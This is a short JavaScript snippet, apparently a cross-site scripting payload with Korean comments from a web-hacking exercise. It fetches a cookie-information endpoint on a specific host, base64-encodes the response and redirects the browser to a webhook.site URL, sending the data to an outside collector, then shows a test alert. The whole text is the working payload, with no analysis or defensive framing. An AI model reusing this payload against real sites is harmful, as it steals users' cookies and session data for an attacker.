let htmlText = '';
fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info')
  .then(res => res.json())
  .then(data => {
    htmlText = JSON.stringify(data); // 객체를 문자열로 변환
    const encodedText = btoa(htmlText);
    location.href = "https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/" + encodedText;
  });

setTimeout(function() {
  alert('check'); // 'cheak' -> 'check'로 수정
}, 1000);
